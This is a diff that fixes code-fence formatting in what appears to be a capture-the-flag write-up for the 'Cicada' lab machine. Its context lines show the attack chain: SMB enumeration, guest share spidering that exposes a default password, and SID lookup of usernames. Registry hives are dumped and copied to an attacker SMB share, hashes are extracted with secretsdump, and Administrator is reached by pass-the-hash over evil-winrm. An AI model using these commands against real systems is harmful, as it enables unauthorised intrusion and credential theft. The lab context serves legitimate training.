@@ -55,7 +55,7 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 65.70 seconds
-```bash
+```
 
 ```
 enum4linux-ng $target | tee enum4linuxng.log
@@ -191,7 +191,7 @@ Server type string: null
  ==========================================
 [-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
 
-```bash
+```
 ```bash
 netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
 ```
@@ -201,7 +201,7 @@ netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=Tr
 Dear new hire!
 Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
-```bash
+```
 ```
   impacket-lookupsid anonymous@10.129.61.174 | tee usernames
 ```bash
@@ -246,11 +246,11 @@ reg save hklm\system C:\Windows\Temp\system
 Transfer files:
 ```bash
 sudo impacket-smbserver -smb2support myshare . 
-```bash
+```
 ```
 copy C:\Windows\Temp\sam \\10.10.14.183\myshare\
 copy C:\Windows\Temp\system \\10.10.14.183\myshare\
-```bash
+```
 ```bash
 impacket-secretsdump -sam sam -system system LOCAL 
 ```
@@ -258,4 +258,4 @@ impacket-secretsdump -sam sam -system system LOCAL
 
 ```bash
 bundle exec evil-winrm.rb -i 10.129.61.174 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
-```bash
+```
